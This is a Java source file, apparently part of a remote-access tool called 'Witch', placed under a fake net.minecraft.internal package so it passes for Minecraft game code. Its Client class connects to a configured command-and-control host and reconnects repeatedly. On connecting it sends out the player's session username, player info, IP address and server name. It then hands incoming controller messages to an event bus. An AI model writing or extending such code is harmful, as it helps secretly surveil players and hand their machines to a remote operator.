package net.minecraft.internal.connection;

import net.minecraft.internal.Witch;
import net.minecraft.internal.events.ConnectionMessageEvent;
import net.minecraft.internal.utils.MCUtils;
import me.soda.witch.shared.NetUtil;
import me.soda.witch.shared.Cfg;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.events.EventBus;
import me.soda.witch.shared.socket.TcpClient;
import me.soda.witch.shared.socket.messages.DisconnectInfo;
import me.soda.witch.shared.socket.messages.Message;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client() {
        super(Cfg.host(), Cfg.port(), 30000);
    }

    @Override
    public boolean onReconnect() {
        boolean tooMany = reconnections > 10;
        if (!tooMany) {
            reconnections++;
        } else {
            reconnectTimeout = -1;
            LogUtil.println("Witch end because of manual shutdown or too many reconnections");
            return false;
        }
        return true;
    }

    @Override
    public void onOpen() {
        LogUtil.println("Connection initialized");
        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + Witch.mc.getSession().getUsername();
        Witch.send("greeting", greetingMsg);
        Witch.send("player", MCUtils.getPlayerInfo());
        Witch.send("ip", NetUtil.getIP());
        Witch.send("server_name");
    }

    @Override
    public void onMessage(Message message) {
        EventBus.INSTANCE.post(ConnectionMessageEvent.get(message));
    }

    @Override
    public void onClose(DisconnectInfo disconnectInfo) {
        LogUtil.println("Disconnected: " + disconnectInfo.reason());
    }
}